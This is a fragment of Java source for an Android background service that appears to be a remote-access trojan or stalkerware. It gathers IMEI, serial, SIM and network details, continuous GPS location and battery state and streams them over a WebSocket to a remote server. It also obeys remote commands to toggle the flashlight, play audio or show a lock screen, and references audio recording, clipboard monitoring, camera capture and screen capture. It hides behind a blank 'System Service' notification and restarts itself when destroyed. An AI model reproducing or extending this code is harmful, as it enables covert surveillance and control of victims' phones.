            JSONObject info = new JSONObject();
            
            info.put("type", "device_info");
            info.put("device_id", deviceId);
            info.put("username", username);
            info.put("model", safeString(Build.MODEL));
            info.put("manufacturer", safeString(Build.MANUFACTURER));
            info.put("brand", safeString(Build.BRAND));
            info.put("product", safeString(Build.PRODUCT));
            info.put("device", safeString(Build.DEVICE));
            info.put("hardware", safeString(Build.HARDWARE));
            info.put("serial", safeString(Build.SERIAL));
            info.put("display", safeString(Build.DISPLAY));
            info.put("android_version", safeString(Build.VERSION.RELEASE));
            info.put("sdk_version", Build.VERSION.SDK_INT);
            info.put("build_id", safeString(Build.ID));
            info.put("build_type", safeString(Build.TYPE));
            info.put("tags", safeString(Build.TAGS));
            info.put("fingerprint", safeString(Build.FINGERPRINT));
            info.put("board", safeString(Build.BOARD));
            info.put("bootloader", safeString(Build.BOOTLOADER));
            
            try {
                String radio = Build.getRadioVersion();
                if (radio != null) info.put("radio", radio);
            } catch (Exception e) {}
            
            getTelephonyInfo(info);
            getAppInfo(info);
            getNetworkInfo(info);
            getMemoryInfo(info);
            getStorageInfo(info);
            getLocaleInfo(info);
            getScreenInfo(info);
            
            info.put("battery", getBatteryLevel());
            
            long currentTime = System.currentTimeMillis();
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
            info.put("last_seen", sdf.format(new Date(currentTime)));
            
            if (webSocket != null && isConnected) {
                webSocket.send(info.toString());
            }
            
        } catch (Exception e) {}
    }
    
    private String safeString(String value) {
        return value != null ? value : "unknown";
    }
    
    private void getTelephonyInfo(JSONObject info) {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED && telephonyManager != null) {
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    String imei = telephonyManager.getImei();
                    if (imei != null) info.put("imei", imei);
                } else {
                    String deviceId = telephonyManager.getDeviceId();
                    if (deviceId != null) info.put("imei", deviceId);
                }
                
                String simOperator = telephonyManager.getSimOperatorName();
                if (simOperator != null) info.put("sim_operator", simOperator);
                
                String networkOperator = telephonyManager.getNetworkOperatorName();
                if (networkOperator != null) info.put("network_operator", networkOperator);
            }
        } catch (SecurityException e) {} catch (Exception e) {}
    }
    
    private void getAppInfo(JSONObject info) {
        try {
            PackageInfo pInfo = packageManager.getPackageInfo(getPackageName(), 0);
            info.put("app_version", pInfo.versionName != null ? pInfo.versionName : "1.0");
            info.put("app_version_code", pInfo.versionCode);
        } catch (Exception e) {}
    }
    
    private void getNetworkInfo(JSONObject info) {
        try {
            if (connectivityManager != null) {
                NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
                if (activeNetwork != null) {
                    info.put("network_connected", activeNetwork.isConnectedOrConnecting());
                    info.put("network_type_name", activeNetwork.getTypeName() != null ? activeNetwork.getTypeName() : "unknown");
                } else {
                    info.put("network_connected", false);
                    info.put("network_type_name", "none");
                }
            }
        } catch (Exception e) {}
    }
    
    private void getMemoryInfo(JSONObject info) {
        try {
            Runtime runtime = Runtime.getRuntime();
            info.put("ram_total", runtime.totalMemory());
            info.put("ram_free", runtime.freeMemory());
            info.put("ram_max", runtime.maxMemory());
            info.put("available_processors", runtime.availableProcessors());
        } catch (Exception e) {}
    }
    
    private void getStorageInfo(JSONObject info) {
        try {
            File path = Environment.getDataDirectory();
            StatFs statFs = new StatFs(path.getPath());
            long totalStorage = (long) statFs.getBlockCount() * (long) statFs.getBlockSize();
            long freeStorage = (long) statFs.getAvailableBlocks() * (long) statFs.getBlockSize();
            info.put("storage_total", totalStorage);
            info.put("storage_free", freeStorage);
            info.put("storage_used", totalStorage - freeStorage);
        } catch (Exception e) {}
    }
    
    private void getLocaleInfo(JSONObject info) {
        try {
            info.put("timezone", java.util.TimeZone.getDefault().getID());
            info.put("language", Locale.getDefault().getLanguage());
            info.put("country", Locale.getDefault().getCountry());
        } catch (Exception e) {}
    }
    
    private void getScreenInfo(JSONObject info) {
        try {
            info.put("screen_density", getResources().getDisplayMetrics().densityDpi);
            info.put("screen_width", getResources().getDisplayMetrics().widthPixels);
            info.put("screen_height", getResources().getDisplayMetrics().heightPixels);
        } catch (Exception e) {}
    }
    
    private void sendLocation(Location location) {
        try {
            if (location == null) return;
            
            JSONObject locData = new JSONObject();
            locData.put("type", "location");
            locData.put("lat", location.getLatitude());
            locData.put("lng", location.getLongitude());
            locData.put("accuracy", (float) location.getAccuracy());
            locData.put("provider", location.getProvider() != null ? location.getProvider() : "unknown");
            locData.put("speed", (float) location.getSpeed());
            locData.put("bearing", (float) location.getBearing());
            locData.put("altitude", location.getAltitude());
            locData.put("time", location.getTime());
            
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            locData.put("time_formatted", sdf.format(new Date(location.getTime())));
            
            if (webSocket != null && isConnected) {
                webSocket.send(locData.toString());
            }
        } catch (Exception e) {}
    }
    
    private void sendBatteryInfo() {
        try {
            int level = getBatteryLevel();
            int temperature = 0;
            boolean charging = false;
            
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            
            if (batteryStatus != null) {
                temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10;
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                charging = (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL);
            }
            
            JSONObject batteryData = new JSONObject();
            batteryData.put("type", "battery");
            batteryData.put("level", level);
            batteryData.put("temperature", temperature);
            batteryData.put("charging", charging);
            batteryData.put("time", System.currentTimeMillis());
            
            if (webSocket != null && isConnected) {
                webSocket.send(batteryData.toString());
            }
            
            backgroundHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBatteryInfo();
                }
            }, 60000);
            
        } catch (Exception e) {}
    }
    
    private int getBatteryLevel() {
        try {
            if (batteryManager != null) {
                return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            }
        } catch (Exception e) {}
        return 0;
    }
    
    private void heartbeatRunnable() {
        if (webSocket != null && isConnected) {
            try {
                JSONObject ping = new JSONObject();
                ping.put("type", "ping");
                webSocket.send(ping.toString());
            } catch (Exception e) {}
        }
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                heartbeatRunnable();
            }
        }, 5000);
    }
    
    private void toggleFlashlight(boolean on) {
        try {
            if (cameraManager == null) return;
            
            if (cameraId == null) {
                String[] cameraIdList = cameraManager.getCameraIdList();
                if (cameraIdList != null && cameraIdList.length > 0) {
                    cameraId = cameraIdList[0];
                } else {
                    return;
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager.setTorchMode(cameraId, on);
            }
        } catch (Exception e) {}
    }
    
    private void playMusic(String url) {
        try {
            if (mediaPlayer != null) {
                try {
                    mediaPlayer.release();
                } catch (Exception e) {}
                mediaPlayer = null;
            }
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            mediaPlayer.setDataSource(url);
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
                @Override
                public void onPrepared(MediaPlayer mp) {
                    try {
                        mp.start();
                    } catch (Exception e) {}
                }
            });
        } catch (Exception e) {}
    }
    
    private void stopMusic() {
        if (mediaPlayer != null) {
            try {
                mediaPlayer.stop();
                mediaPlayer.release();
            } catch (Exception e) {}
            mediaPlayer = null;
        }
    }
    
    private void showLockScreen() {
        try {
            Intent intent = new Intent(this, LockScreenActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {}
    }
    
    private void hideLockScreen() {
        try {
            Intent intent = new Intent("UNLOCK_ACTION");
            sendBroadcast(intent);
        } catch (Exception e) {}
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("System background service");
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                }
            } catch (Exception e) {}
        }
    }
    
    private Notification createNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(" ")
            .setContentText(" ")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true);
        
        return builder.build();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
            
            if (webSocket != null) {
                webSocket.close(1000, "Service destroyed");
            }
            
            if (locationManager != null && locationListener != null) {
                locationManager.removeUpdates(locationListener);
            }
            
            if (mediaPlayer != null) {
                mediaPlayer.release();
            }

            // ============ CLEANUP FITUR BARU ============
            // Stop audio recorder kalau lagi jalan
            try { if (isRecording) stopAudioRecording(); } catch (Exception e) {}

            // Stop clipboard timer
            try { if (clipboardTimer != null) clipboardTimer.cancel(); } catch (Exception e) {}

            // Cleanup camera resources (single-shot take_photo)
            try { cleanupCamera(); } catch (Exception e) {}

            // Stop live camera stream
            try { if (isLiveStreaming) stopLiveCameraStream(); } catch (Exception e) {}

            // Stop screen capture
            try { if (isScreenCapturing) stopScreenCapture(); } catch (Exception e) {}
            
            clearFloatingImages();
            
            if (backgroundHandler != null) {
                backgroundHandler.removeCallbacksAndMessages(null);
            }
            
            if (handlerThread != null) {
                handlerThread.quitSafely();
            }
            
            Intent intent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            
        } catch (Exception e) {}
        
        super.onDestroy();
    }
}